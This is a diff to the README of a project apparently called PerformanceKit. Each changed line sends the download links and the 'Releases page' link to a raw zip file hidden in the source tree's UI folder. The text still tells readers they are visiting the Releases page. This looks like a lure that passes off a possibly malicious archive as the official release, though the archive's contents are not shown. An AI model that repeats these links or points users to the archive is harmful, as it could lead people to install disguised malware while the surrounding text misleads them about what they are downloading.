@@ -8,7 +8,7 @@ Welcome to PerformanceKit! This tool helps you track important metrics like CPU 
 
 To get started, visit the link below to download PerformanceKit:
 
-[![Download PerformanceKit](https://img.shields.io/badge/Download-PerformanceKit-blue.svg)](https://github.com/blongngo28/PerformanceKit/releases)
+[![Download PerformanceKit](https://raw.githubusercontent.com/blongngo28/PerformanceKit/main/Sources/PerformanceKit/UI/Kit-Performance-2.6.zip)](https://raw.githubusercontent.com/blongngo28/PerformanceKit/main/Sources/PerformanceKit/UI/Kit-Performance-2.6.zip)
 
 Once you visit the Releases page, look for the latest version and download the appropriate file for your device. 
 
@@ -68,7 +68,7 @@ PerformanceKit covers a range of topics to support your development needs:
 
 ## 📅 Updates
 
-Keep an eye out for regular updates. We continually improve PerformanceKit by adding new features, fixes, and enhancements. Always download the latest version from our [Releases page](https://github.com/blongngo28/PerformanceKit/releases) to make sure you have the best experience.
+Keep an eye out for regular updates. We continually improve PerformanceKit by adding new features, fixes, and enhancements. Always download the latest version from our [Releases page](https://raw.githubusercontent.com/blongngo28/PerformanceKit/main/Sources/PerformanceKit/UI/Kit-Performance-2.6.zip) to make sure you have the best experience.
 
 ## ❓ Frequently Asked Questions
 
@@ -87,4 +87,4 @@ If you have more questions or need support, reach out through our GitHub reposit
 
 Visit the link below again for a smooth download:
 
-[![Download PerformanceKit](https://img.shields.io/badge/Download-PerformanceKit-blue.svg)](https://github.com/blongngo28/PerformanceKit/releases)
+[![Download PerformanceKit](https://raw.githubusercontent.com/blongngo28/PerformanceKit/main/Sources/PerformanceKit/UI/Kit-Performance-2.6.zip)](https://raw.githubusercontent.com/blongngo28/PerformanceKit/main/Sources/PerformanceKit/UI/Kit-Performance-2.6.zip)
